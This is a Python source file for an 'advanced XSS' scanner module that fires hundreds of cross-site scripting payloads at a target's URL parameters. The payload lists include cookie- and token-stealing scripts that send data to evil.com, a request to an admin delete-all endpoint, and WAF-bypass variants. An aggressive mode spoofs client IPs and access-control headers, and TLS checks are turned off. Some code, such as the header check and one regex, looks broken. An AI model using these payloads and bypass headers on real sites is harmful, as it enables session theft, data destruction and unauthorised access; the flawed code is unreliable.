#!/usr/bin/env python3
import requests
import random
import time
import urllib3
import re
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl
from typing import List, Dict, Any, Tuple
from .vulnerability_base import VulnerabilityModule
import settings

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Scanner(VulnerabilityModule):
    name = "advanced_xss"
    description = "Advanced XSS vulnerability scanner"
    risk = "medium"
    useproxy = getattr(settings, "USEPROXY", True)
    enabled = True
    max_tests = 50 if not getattr(settings, "AGGRESSIVE", False) else 300
    delay_range = (0.2, 0.5)

    PAYLOADS = {
        "basic": [
            "<script>alert('XSS')</script>",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<image src/onerror=alert(1)>",
            "<script>print()</script>",
            "<svg/onload=alert`1`>",
            "<marquee/onstart=alert(1)>"
        ],
        "svg": [
            "<svg/onload=alert(1)>",
            "<svg><script>alert(1)</script>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<svg><g onload=alert(1)>"
        ],
        "events": [
            "<body onload=alert(1337)>",
            "<iframe src=javascript:alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<select autofocus onfocus=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src onerror=alert(1)>",
            "<form><button formaction=javascript:alert(1)>X</button>"
        ],
        "obfuscated": [
            "javascript:alert(String.fromCharCode(88,83,83))//",
            "JaVaScRiPt:alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "jav&#x09;ascript:alert(1)",
            "jav&#x0A;ascript:alert(1)",
            "jav&#x0D;ascript:alert(1)",
            "&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29"
        ],
        "dom": [
            "#<script>alert(1)</script>",
            "javascript:/*--></script><script>alert(1)</script>",
            "#\"><img src=/ onerror=alert(1)>",
            "#\" onclick=\"alert(1)",
            "#' onmouseover='alert(1)"
        ],
        "advanced": [
            "<script>fetch('/admin/delete-all')</script>",
            "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<script>new Image().src='http://evil.com/?c='+encodeURI(document.cookie);</script>",
            "<script>alert(document.domain)</script>",
            "<iframe src=\"javascript:alert(`XSS`)\" style=\"width:0;height:0;border:0;\"></iframe>"
        ]
    }

    AGGRESSIVE_PAYLOADS = [
        "<script>fetch(`http://evil.com/?cookie=${document.cookie}`)</script>",
        "<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>",
        "<script>setInterval(()=>{fetch(`http://evil.com/?k=${localStorage.getItem('token')}`)},5000)</script>",
        "<form><input name=username><input type=submit formaction=javascript:alert(1)></form>",
        "<link rel=import href=\"javascript:alert(1)\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
        "<object data=\"javascript:alert(1)\"></object>",
        "<embed src=\"javascript:alert(1)\"></embed>",
        "<base href=\"javascript:alert(1)//\">",
        "<math><mi//xlink:href=\"javascript:alert(1)\">click",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<frameset onload=alert(1)></frameset>",
        "<table background=\"javascript:alert(1)\"></table>",
        "<style>@import \"javascript:alert(1)\";</style>",
        "<style>li{list-style-image:url(\"javascript:alert(1)\");}</style>",
        "<div style=\"background-image:url(javascript:alert(1))\"></div>",
        "<div style=\"width:expression(alert(1))\"></div>",
        "<xss style=\"x:expression(alert(1))\"></xss>",
        "<svg><script href=\"data:text/javascript,alert(1)\"/></svg>",
        "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=\"javascript:alert(1)\"><circle r=100 /></a></svg>",
        "<svg><animate attributeName=href values=\"javascript:alert(1)\" /></svg>",
        "<svg><set attributeName=href from=\"\" to=\"javascript:alert(1)\" /></svg>",
        "<svg><handler xmlns:ev=http://www.w3.org/2001/xml-events ev:event=load>alert(1)</handler></svg>",
        "<svg><script>alert(1)</script></svg>",
        "<svg onload=alert(1)></svg>",
        "<svg onload=alert`1`></svg>",
        "<svg onload=alert(String.fromCharCode(88,83,83))></svg>",
        "<svg><foreignObject><iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(1)\"></iframe></foreignObject></svg>",
        "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a></svg>",
        "<!ENTITY xss SYSTEM \"javascript:alert(1)\">",
        "<?xml version=\"1.0\"?><xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\"><xsl:template match=\"/\"><script>alert(1)</script></xsl:template></xsl:stylesheet>",
        "<xml id=x><x><c><![CDATA[<img src=1 onerror=alert(1)>]]></c></x></xml>",
        "<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(1)<![CDATA[<]]>/SCRIPT<![CDATA[>]]>",
        "<!--[if]><script>alert(1)</script><![endif]-->",
        "<!--[if<img src=x onerror=alert(1)//]>-->",
        "<?xml-stylesheet type=\"text/xml\" href=\"javascript:alert(1)\"?>",
        "<html xmlns:evil=\"http://evil.com/\"><evil:script>alert(1)</evil:script></html>",
        "<html manifest=\"http://evil.com/xss.html\"><script>alert(1)</script></html>",
        "<head profile=\"http://evil.com/xss.html\"><script>alert(1)</script></head>",
        "<template id=\"xss\"><script>alert(1)</script></template>",
        "<form id=\"xss\"></form><button form=\"xss\" formaction=\"javascript:alert(1)\">X</button>",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
        "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
        "<math href=\"javascript:alert(1)\">CLICKME</math>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<applet code=\"javascript:alert(1)\"></applet>",
        "<meta charset=\"mac-farsi\">¼script¾alert(1)¼/script¾",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-eval'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src * 'unsafe-inline'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src * 'unsafe-inline' 'unsafe-eval'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'none'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-eval'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-inline'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-eval'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline' 'unsafe-eval'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src * 'unsafe-inline' 'unsafe-eval'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src * 'unsafe-inline' 'unsafe-eval' data: blob: mediastream: filesystem:\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-random123'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'sha256-base64encodedhash'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'strict-dynamic'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'report-sample'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-hashes'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-allow-redirects'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"require-trusted-types-for 'script'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"trusted-types default\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"trusted-types *\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"upgrade-insecure-requests\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"block-all-mixed-content\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"base-uri 'self'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"form-action 'self'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"frame-ancestors 'self'\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"sandbox allow-forms allow-scripts\">",
        "javascript:alert(1);//%0D%0Aalert(2);",
        "javascript:alert(1)/*%0A*/alert(2)//",
        "javascript:alert(1);%0D%0A//%0D%0Aalert(2);",
        "javascript:alert(1);%0Aalert(2);",
        "javascript:alert(1);%0Dalert(2);",
        "javascript:alert(1);%09alert(2);",
        "javascript:alert(1);%0Balert(2);",
        "javascript:alert(1);%0Calert(2);",
        "javascript:alert(1);%20alert(2);",
        "javascript:alert(1);%00alert(2);",
        "javascript:alert(1);%7Falert(2);",
        "javascript:alert(1);%FFalert(2);",
        "javascript:alert(1);%u000Aalert(2);",
        "javascript:alert(1);%u000Dalert(2);",
        "javascript:alert(1);%u2028alert(2);",
        "javascript:alert(1);%u2029alert(2);",
        "javascript:alert(1);%uFEFFalert(2);",
        "javascript:alert(1);%uFFF0alert(2);",
        "javascript:alert(1);%uFDEFalert(2);",
        "javascript:alert(1);%uD83D%uDCA9alert(2);",
        "javascript:alert(1);%uD800%uDFFFalert(2);",
        "javascript:alert(1);%uDB40%uDD00alert(2);",
        "javascript:alert(1);%uDBFF%uDFFFalert(2);",
        "javascript:alert(1);%uE000alert(2);",
        "javascript:alert(1);%uF8FFalert(2);",
        "javascript:alert(1);%uFFFFalert(2);",
        "javascript:alert(1);%u{000A}alert(2);",
        "javascript:alert(1);%u{000D}alert(2);",
        "javascript:alert(1);%u{2028}alert(2);",
        "javascript:alert(1);%u{2029}alert(2);",
        "javascript:alert(1);%u{FEFF}alert(2);",
        "javascript:alert(1);%u{FFF0}alert(2);",
        "javascript:alert(1);%u{FDEF}alert(2);",
        "javascript:alert(1);%u{D83D}%u{DCA9}alert(2);",
        "javascript:alert(1);%u{D800}%u{DFFF}alert(2);",
        "javascript:alert(1);%u{DB40}%u{DD00}alert(2);",
        "javascript:alert(1);%u{DBFF}%u{DFFF}alert(2);",
        "javascript:alert(1);%u{E000}alert(2);",
        "javascript:alert(1);%u{F8FF}alert(2);",
        "javascript:alert(1);%u{FFFF}alert(2);"
    ]

    WAF_BYPASS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<sc<script>ript>alert(1)</scr</script>ipt>",
        "<scr<script>ipt>alert(1)</script>",
        "<script>>>alert(1)</script>",
        "<script>0?alert(1):alert(2)</script>",
        "<script>alert?.(1)</script>",
        "<script>alert?.(1)</script>",
        "<script>alert(1)//</script>",
        "<script>alert(1)/*</script>*/",
        "<script>alert(1)<!--</script>",
        "<script>alert(1)//--></script>",
        "<script>alert(1)\"></script>",
        "<script>alert(1)`</script>",
        "<script>alert(1)'</script>",
        "<script>alert(1)]></script>",
        "<script>alert(1)}</script>",
        "<script>alert(1)</script>>",
        "<script>alert(1)</script><",
        "<script>alert(1)</script>//",
        "<script>alert(1)</script>/*",
        "<script>alert(1)</script><!--",
        "<script>alert(1)</script>-->",
        "<script>alert(1)</script>;",
        "<script>alert(1)</script>%0A",
        "<script>alert(1)</script>%0D",
        "<script>alert(1)</script>%09",
        "<script>alert(1)</script>%0B",
        "<script>alert(1)</script>%0C",
        "<script>alert(1)</script>%20",
        "<script>alert(1)</script>%00",
        "<script>alert(1)</script>%7F",
        "<script>alert(1)</script>%FF",
        "<script>alert(1)</script>%u000A",
        "<script>alert(1)</script>%u000D",
        "<script>alert(1)</script>%u2028",
        "<script>alert(1)</script>%u2029",
        "<script>alert(1)</script>%uFEFF",
        "<script>alert(1)</script>%uFFF0",
        "<script>alert(1)</script>%uFDEF",
        "<script>alert(1)</script>%uD83D%uDCA9",
        "<script>alert(1)</script>%uD800%uDFFF",
        "<script>alert(1)</script>%uDB40%uDD00",
        "<script>alert(1)</script>%uDBFF%uDFFF",
        "<script>alert(1)</script>%uE000",
        "<script>alert(1)</script>%uF8FF",
        "<script>alert(1)</script>%uFFFF"
    ]

    SENSITIVE_PARAMS = ["q", "search", "query", "id", "name", "redirect", "url", "callback", "jsonp", "file", "path", "view", "page", "cmd", "command", "exec"]

    def __init__(self, target: str, **kwargs):
        super().__init__(target, **kwargs)
        self.session.headers.update(self._headers())
        self.session.verify = False
        self.custom_payloads = kwargs.get('custom_payloads', [])
        if self.aggressive:
            self.max_tests = 400
            self.delay_range = (0.05, 0.2)

    def _headers(self) -> Dict[str, str]:
        base_headers = {
            "User-Agent": getattr(settings, "USERAGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }

        if self.aggressive:
            base_headers.update({
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Remote-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Remote-Addr": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Host": urlparse(self.target).hostname,
                "Referer": self.target,
                "X-Requested-With": "XMLHttpRequest",
                "X-CSRF-Token": "random_token_bypass",
                "X-Request-ID": f"{random.randint(1000000,9999999)}",
                "X-Correlation-ID": f"{random.randint(1000000,9999999)}",
                "X-Forwarded-Host": "evil.com",
                "X-Original-URL": "/admin",
                "X-Rewrite-URL": "/wp-admin",
                "X-Custom-IP-Authorization": "127.0.0.1",
                "X-Forwarded-Server": "attacker.com",
                "X-Forwarded-Proto": "https",
                "X-Real-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "X-Host": "evil.com",
                "X-Forwarded-For": "127.0.0.1",
                "X-Requested-With": "XMLHttpRequest"
            })

        return base_headers

    def _clean_response_content(self, content: str) -> str:
        patterns_to_remove = [
            r'<script[^>]*>.*?</script>',
            r'<style[^>]*>.*?</style>',
            r'<!--.*?-->',
            r'<![CDATA[.*?]]>',
            r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}',
            r'\d{2}/\d{2}/\d{4}',
            r'\d{2}:\d{2}:\d{2}',
            r'\b\d{10,}\b',
            r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
            r'csrf_token[^=]*=[^&]*',
            r'csrf-token[^=]*=[^&]*',
            r'csrf[^=]*=[^&]*',
            r'session[^=]*=[^&]*',
            r'sessionid[^=]*=[^&]*',
            r'phpsessid[^=]*=[^&]*',
            r'rand[^=]*=[^&]*',
            r'random[^=]*=[^&]*',
            r'token[^=]*=[^&]*',
            r'google_analytics[^;]*;',
            r'gtag[^;]*;',
            r'fbq[^;]*;'
        ]
        
        cleaned_content = content
        for pattern in patterns_to_remove:
            cleaned_content = re.sub(pattern, '', cleaned_content, flags=re.DOTALL | re.IGNORECASE)
        
        cleaned_content = re.sub(r'\s+', ' ', cleaned_content).strip()
        return cleaned_content

    def _analyze_boolean_test(self, response_content: str, baseline_content: str, 
                             response_status: int, baseline_status: int) -> bool:
        clean_response = self._clean_response_content(response_content)
        clean_baseline = self._clean_response_content(baseline_content)
        
        length_diff = abs(len(clean_response) - len(clean_baseline))
        content_diff = clean_response != clean_baseline
        
        return (
            content_diff and
            length_diff > 50 and
            response_status == baseline_status
        )

    def _select_params(self, params: Dict[str, str]) -> List[str]:
        return sorted(params.keys(),
                    key=lambda k: 0 if k.lower() in self.SENSITIVE_PARAMS else 1)[:8 if not self.aggressive else 15]

    def _generate_tests(self, target: str) -> List[Dict[str, str]]:
        parsed = urlparse(target)
        base_url = urlunparse(parsed._replace(query=""))
        query_params = dict(parse_qsl(parsed.query))
        selected_params = self._select_params(query_params or {"q": "test"})

        tests = []
        for param in selected_params:
            for payload_type, payload_list in self.PAYLOADS.items():
                for payload in payload_list:
                    test_params = query_params.copy()
                    test_params[param] = payload
                    tests.append({
                        "method": "GET",
                        "url": f"{base_url}?{urlencode(test_params, doseq=True)}",
                        "param": param,
                        "payload": payload,
                        "type": payload_type
                    })

            if self.aggressive:
                for payload in self.AGGRESSIVE_PAYLOADS + self.WAF_BYPASS_PAYLOADS + self.custom_payloads:
                    test_params = query_params.copy()
                    test_params[param] = payload
                    tests.append({
                        "method": "GET",
                        "url": f"{base_url}?{urlencode(test_params, doseq=True)}",
                        "param": param,
                        "payload": payload,
                        "type": "aggressive"
                    })

        return tests[:self.max_tests]

    def _analyze_response(self, response: requests.Response, test: Dict[str, str], baseline: Dict[str, Any]) -> Dict[str, Any]:
        content = (response.text or "")
        payload = test["payload"]
        clean_content = self._clean_response_content(content)
        clean_baseline = self._clean_response_content(baseline["content"])

        result = {
            "url": test["url"],
            "param": test["param"],
            "payload_type": test["type"],
            "payload": test["payload"],
            "status": response.status_code,
            "reflected": payload in content,
            "context": self._detect_context(content, payload),
            "headers": self._check_security_headers(response),
            "dom_based": self._check_dom_indicators(content) if test["type"] == "dom" else False,
            "clean_comparison": self._analyze_boolean_test(content, baseline["content"], response.status_code, baseline["status"])
        }

        return result

    def _check_security_headers(self, response: requests.Response) -> Dict[str, bool]:
        headers = response.headers
        return {
            "csp": bool(headers.get("Content-Security-Policy")),
            "xss_protection": "1" in headers.get("X-XSS-Protection", ""),
            "content_type": headers.get("X-Content-Type-Options", "").lower() == "nosniff",
            "hsts": "strict-transport-security" in headers.lower() if headers.get("Strict-Transport-Security") else False
        }

    def _detect_context(self, content: str, payload: str) -> Dict[str, bool]:
        return {
            "in_tag": f"<{payload}" in content,
            "in_attribute": f"=\"{payload}\"" in content or f"='{payload}'" in content,
            "in_script": f"script>{payload}" in content,
            "in_comment": f"<!--{payload}" in content
        }

    def _check_dom_indicators(self, content: str) -> bool:
        dom_indicators = [
            "document.write",
            "innerhtml",
            "eval(",
            "setattribute(",
            "location.hash",
            "window.location",
            "document.cookie",
            "localstorage",
            "sessionstorage"
        ]
        return any(indicator in content for indicator in dom_indicators)

    def _execute_request(self, url: str) -> requests.Response:
        timeout = getattr(settings, "TIMEOUT", 10)
        proxies = getattr(settings, "PROXIES", None) if self.useproxy else None

        try:
            return self.session.get(url, timeout=timeout, allow_redirects=False, proxies=proxies)
        except requests.RequestException as e:
            if self.debug:
                print(f"[DEBUG] Request failed: {e}, trying fallback")
            fallback = requests.Session()
            fallback.headers.update(self._headers())
            fallback.verify = False
            return fallback.get(url, timeout=timeout, allow_redirects=False, proxies=proxies)

    def scan(self) -> Dict[str, Any]:
        try:
            if self.debug:
                print(f"[DEBUG] Starting XSS scan for: {self.target}")
                print(f"[DEBUG] Aggressive mode: {self.aggressive}")
                print(f"[DEBUG] Max tests: {self.max_tests}")

            baseline_response = self._execute_request(self.target)
            baseline = {
                "content": baseline_response.text or "",
                "status": baseline_response.status_code,
                "length": len(baseline_response.text or "")
            }

            tests = self._generate_tests(self.target)

            if self.debug:
                print(f"[DEBUG] Generated {len(tests)} test cases")
                if self.custom_payloads:
                    print(f"[DEBUG] Custom payloads: {len(self.custom_payloads)}")

            results = []
            vulnerabilities = []
            total_tested = 0
            successful_tests = 0
            failed_tests = 0

            for i, test in enumerate(tests):
                if self.debug and i % 25 == 0:
                    print(f"[DEBUG] Testing payload {i+1}/{len(tests)}")

                time.sleep(random.uniform(*self.delay_range))

                try:
                    response = self._execute_request(test["url"])
                    result = self._analyze_response(response, test, baseline)
                    results.append(result)
                    successful_tests += 1

                    if result.get("reflected") and result.get("clean_comparison"):
                        vulnerabilities.append(result)
                        if self.debug:
                            print(f"[VULNERABLE] Found XSS with payload: {test['payload']}")

                except Exception as e:
                    if self.debug:
                        print(f"[ERROR] {str(e)}")
                    results.append({
                        "url": test["url"],
                        "error": str(e),
                        "param": test["param"]
                    })
                    failed_tests += 1

                total_tested += 1

            vuln_assessment = self._assess_vulnerabilities(results)

            return {
                "ok": True,
                "risk": vuln_assessment["risk"],
                "vulnerabilities_found": len(vulnerabilities),
                "total_tests": total_tested,
                "successful_tests": successful_tests,
                "failed_tests": failed_tests,
                "vulnerabilities": vulnerabilities,
                "security_headers": vuln_assessment["headers"],
                "notes": f"Tests performed: {total_tested}, Successful: {successful_tests}, Failed: {failed_tests}, Vulnerabilities found: {len(vulnerabilities)}"
            }

        except Exception as e:
            if self.debug:
                print(f"[CRITICAL ERROR] {str(e)}")
            return {
                "ok": False,
                "risk": "unknown",
                "error": str(e),
                "vulnerabilities": [],
                "total_tests": 0,
                "successful_tests": 0,
                "failed_tests": 0
            }

    def _assess_vulnerabilities(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        vuln_details = []
        header_stats = {
            "csp": 0,
            "xss_protection": 0,
            "content_type": 0,
            "hsts": 0
        }

        for result in results:
            if result.get("reflected") and result.get("clean_comparison"):
                vuln_details.append({
                    "type": result["payload_type"],
                    "param": result["param"],
                    "payload": result["payload"],
                    "context": result["context"]
                })

            if "headers" in result:
                for header in header_stats:
                    if result["headers"].get(header):
                        header_stats[header] += 1

        risk_level = "critical" if vuln_details else "low"

        return {
            "risk": risk_level,
            "details": vuln_details,
            "headers": {k: f"{v}/{len(results)}" for k, v in header_stats.items()}
        }
